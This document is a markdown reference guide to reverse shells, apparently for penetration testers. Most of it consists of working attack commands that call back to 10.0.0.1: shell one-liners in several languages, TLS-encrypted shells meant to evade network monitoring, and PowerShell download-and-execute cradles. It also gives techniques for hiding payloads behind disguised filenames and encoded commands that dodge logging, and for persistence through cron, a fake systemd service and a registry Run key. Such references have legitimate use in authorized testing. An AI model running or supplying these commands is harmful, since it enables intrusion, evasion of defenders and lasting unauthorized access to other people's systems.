# Reverse Shell Complete Guide

> Comprehensive reference for generating reverse shells across platforms, setting up listeners, and stabilizing raw shell sessions. Covers Bash, Python, Netcat, Socat, and Nishang for both Linux and Windows targets.

## Introduction

Reverse shells are the fundamental building block of post-exploitation access. Unlike bind shells (where the target listens and the attacker connects), reverse shells initiate the connection from the target to the attacker, bypassing NAT and firewall restrictions that block inbound connections. This guide covers every major reverse shell technique, from simple one-liners to fully interactive encrypted sessions, with listener setup and stabilization procedures for each.

The guide follows the practical workflow: generate the appropriate shell for the target environment, set up a matching listener, catch the connection, and immediately stabilize it into a usable interactive session. Each technique includes the specific scenarios where it excels and its limitations.

---

## 1. Reverse Shell One-Liners by Language

### Bash

```bash
# Standard bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Using /bin/sh for minimal footprint
/bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Bash reverse shells are the first technique to try on Linux targets. They require no external tools, only the bash shell itself with networking compiled in (most modern distributions include this). The `/dev/tcp` pseudo-device is a bash built-in, not a real file, so it works even in restricted environments. Limitations: some hardened systems disable `/dev/tcp` at compile time, and bash may not be available (Alpine Linux uses ash by default).

### Python

```bash
# Python3 reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
```

Python is the most reliable fallback when bash is unavailable. Python3 is installed by default on nearly all modern Linux distributions and macOS. The shell works by duplicating the socket file descriptor onto stdin (0), stdout (1), and stderr (2), then spawning a shell that reads from and writes to those descriptors.

### Netcat

```bash
# Traditional nc with -e flag (not available in all builds)
nc -e /bin/sh 10.0.0.1 4444

# Modern alternative using mkfifo (works with openbsd-netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

The `-e` flag (execute program after connect) is disabled in many modern netcat builds (particularly the OpenBSD variant used by default on Kali). The mkfifo technique works around this by creating a named pipe: `cat` reads from the pipe and feeds into the shell, while netcat output goes back into the pipe, creating a bidirectional data flow.

### PowerShell (Windows)

```powershell
# Full PowerShell reverse shell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

PowerShell is always available on modern Windows systems (Windows 7+). The `-nop` flag bypasses the user profile to speed execution and avoid profile-based logging. For delivery, encode the command with `iconv -t utf-16le | base64` and use `powershell -nop -enc <BASE64>` to avoid command-line logging of the plaintext payload.

---

## 2. Listener Setup

### Netcat Listener

```bash
# Basic listener
nc -lvnp 4444

# With rlwrap for history and arrow keys
rlwrap nc -lvnp 4444

# Keep-alive listener (re-listens after session drops)
while true; do nc -lvnp 4444; done
```

The `-l` flag enables listen mode, `-v` enables verbose output (shows connection details), `-n` disables DNS resolution (faster), and `-p` specifies the port. Always use `-n` to avoid slow reverse DNS lookups when a target connects. The keep-alive wrapper is essential for testing — when a shell drops, the listener automatically restarts.

### Metasploit Multi/Handler

```bash
# For staged meterpreter payloads (required)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"

# Resource script for repeatable setup
cat > handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j
EOF
msfconsole -r handler.rc
```

Multi/handler is mandatory for staged payloads because the second stage must be served by metasploit. The `ExitOnSession false` flag keeps the listener running after catching a session, allowing multiple targets to connect. Resource scripts (`.rc` files) enable repeatable, scripted listener deployment.

---

## 3. Shell Stabilization

Raw reverse shells are fragile: Ctrl+C kills the session, arrow keys produce escape sequences, tab completion does not work, and interactive programs (su, nano, ssh) fail. Stabilization converts the raw shell into a full interactive terminal.

### Method 1: Python PTY Upgrade

```bash
# Step 1: Inside the raw shell, spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)

# Step 3: Configure attacker terminal to pass through key sequences
stty raw -echo; fg

# Step 4: Press Enter twice, then set terminal type
export TERM=xterm
stty rows 38 cols 136
```

This is the most common stabilization method. The `stty raw -echo` command disables local echo and line processing on the attacker terminal, so key presses are sent directly to the remote shell. The `fg` command brings the backgrounded shell back to the foreground with these new terminal settings.

### Method 2: Socat PTY Shell

```bash
# Listener (attacker): provides full PTY
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0

# Connect-back (target): requests PTY from socat
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

The socat method provides a fully interactive shell from the start — no manual stabilization needed. The `pty` option allocates a pseudo-terminal, `stderr` redirects stderr, `setsid` creates a new session, `sigint` passes Ctrl+C correctly, and `sane` sets reasonable terminal defaults.

### Method 3: rlwrap Enhancement

```bash
# Start listener with rlwrap for basic readline support
rlwrap nc -lvnp 4444
```

rlwrap adds command history and arrow key support to any connection. It does not provide full PTY functionality (interactive programs still fail), but it prevents accidental shell termination and makes navigation easier. Combine with Python PTY upgrade for complete stabilization.

---

## 4. Encoding Options for Shell Delivery

```bash
# Base64 encode a PowerShell command for -enc delivery
CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
echo "powershell -nop -enc $ENCODED"

# URL-encode a shell command for injection via HTTP parameter
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))"
```

Encoding serves two purposes: evading basic signature detection and safely transporting shell commands through protocols that restrict certain characters. PowerShell `-enc` delivery is the standard technique for Windows payloads because it bypasses command-line logging and many string-based detection rules.

---

## References

- [Reverse Shell Cheat Sheet (PentestMonkey)](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
- [PayloadsAllTheThings - Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Nishang GitHub](https://github.com/samratashok/nishang)
- [Socat Manual](http://www.dest-unreach.org/socat/doc/socat.html)

---

## 5. Advanced Reverse Shell Techniques

### Encrypted Reverse Shells with OpenSSL

When network monitoring detects unencrypted reverse shell connections, wrapping the connection in TLS encryption makes the traffic indistinguishable from legitimate HTTPS communication.

```bash
# Step 1: Generate a self-signed certificate on the attacker machine
openssl req -newkey rsa:2048 -nodes -keyout reverse_key.pem \
  -x509 -days 365 -out reverse_cert.pem -subj "/CN=localhost"
cat reverse_key.pem reverse_cert.pem > reverse.pem

# Step 2: Start the encrypted listener
openssl s_server -quiet -key reverse_key.pem -cert reverse_cert.pem -port 4443
# Or use socat for a more capable encrypted listener:
socat OPENSSL-LISTEN:4443,cert=reverse.pem,verify=0,reuseaddr,fork FILE:`tty`,raw,echo=0

# Step 3: On the target, connect with encrypted reverse shell
# Linux target:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4443 > /tmp/s; rm /tmp/s

# Alternative Linux target with socat:
socat OPENSSL:10.0.0.1:4443,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# The encrypted tunnel prevents network IDS from detecting the shell connection
# Traffic appears as a TLS connection to a server with a self-signed certificate
```

### Reverse Shell with OpenSSL (Windows Target)

```powershell
# PowerShell encrypted reverse shell using TLS
# Works against networks with SSL inspection that blocks unencrypted shells

# Generate certificate on attacker, then on target:
$client = New-Object System.Net.Sockets.TcpClient('10.0.0.1',4443)
$stream = $client.GetStream()
$ssl = New-Object System.Net.Security.SslStream($stream,$false,{$true})
$ssl.AuthenticateAsClient('localhost')
$writer = New-Object System.IO.StreamWriter($ssl)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($ssl)
while ($true) {
  $cmd = $reader.ReadLine()
  if ($cmd -eq 'exit') { break }
  try {
    $result = (Invoke-Expression $cmd 2>&1 | Out-String)
    $writer.WriteLine($result)
  } catch {
    $writer.WriteLine("Error: $_")
  }
}
$client.Close()
```

### Reverse Shell Payload Generators

Automated tools generate obfuscated reverse shell payloads that bypass common detection patterns.

```bash
# revshellgen - automated reverse shell payload generator
pip3 install revshellgen
revshellgen -i 10.0.0.1 -p 4444 -t bash -o shell.sh
revshellgen -i 10.0.0.1 -p 4444 -t python -o shell.py
revshellgen -i 10.0.0.1 -p 4444 -t powershell -o shell.ps1

# msfvenom with bad character exclusion for exploit development
# When working with buffer overflows, certain bytes break the exploit
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d\x23\x25\x26\x3c\x3e\x3f' \
  -f python -o shellcode.py
# The -b flag generates an encoder stub that avoids the specified bytes
```

### Filenames and Obfuscation

```bash
# Avoid suspicious filenames in delivery payloads
# Use legitimate-looking names for payload files

# Windows payload naming conventions
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f exe -o "update.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f exe -o "README.pdf.exe"  # Double extension (requires hide extensions disabled)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f dll -o "version.dll"     # DLL side-loading

# Unicode/RTL override for filename obfuscation (Windows)
# Create a file named "txt.exe" that appears as "exe.txt"
# Using right-to-left override character (U+202E)
python3 -c "print('update‮txt.exe')"  # Displays as update.exe
```

## 6. Shell Upgrade and Persistence Techniques

### Automated Shell Stabilization Script

```bash
# One-command shell stabilization (run after catching reverse shell)
# This script handles the complete stabilization process
cat > stabilize.sh << 'SCRIPT'
#!/bin/bash
# Usage: After catching a raw shell, run this on the attacker machine
# The script sends stabilization commands through the existing shell

echo "[*] Attempting PTY spawn with python3..."
echo 'python3 -c "import pty; pty.spawn(\"/bin/bash\")"'
sleep 1

echo "[*] After PTY spawn, press Ctrl+Z then run:"
echo "    stty raw -echo; fg"
echo ""
echo "[*] After foregrounding, run in the shell:"
echo "    export TERM=xterm"
echo "    stty rows \$LINES cols \$COLUMNS"
SCRIPT
chmod +x stabilize.sh
```

### Persistent Reverse Shell Techniques

```bash
# Cron-based persistent reverse shell (Linux)
# Add to target's crontab for reconnection every 5 minutes
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -

# Systemd service persistent reverse shell (Linux)
cat > /tmp/shell.service << 'EOF'
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
sudo mv /tmp/shell.service /etc/systemd/system/
sudo systemctl enable shell
sudo systemctl start shell

# Windows persistent reverse shell via registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')\"" /f
```

## 7. Troubleshooting Common Shell Issues

### Shell Dies Immediately

```bash
# Problem: Shell connects but immediately closes
# Cause 1: Firewall resets the connection
# Fix: Try a different port (443, 80, 53)
nc -lvnp 443  # Use a commonly allowed port

# Cause 2: Target has egress filtering
# Fix: Test which outbound ports are allowed
for port in 443 80 8080 53 22; do
  timeout 3 bash -c "echo test >& /dev/tcp/10.0.0.1/$port 2>/dev/null" && echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done

# Cause 3: Payload architecture mismatch
# Fix: Generate correct architecture payload
# Check target architecture before generating payload
uname -m  # On target (if accessible)
# x86_64 -> use x64 payloads
# i686 -> use x86 payloads
```

### Shell Has No Interactive Capabilities

```bash
# Problem: Cannot run su, sudo, nano, ssh, or other interactive programs
# Cause: No PTY allocated
# Fix: Use the stabilization methods described in Section 3

# Quick fix: use script command for basic PTY
script /dev/null -c bash

# Alternative: use expect for interactive programs
expect -c 'spawn su -; expect "Password:"; send "password\r"; interact'
```
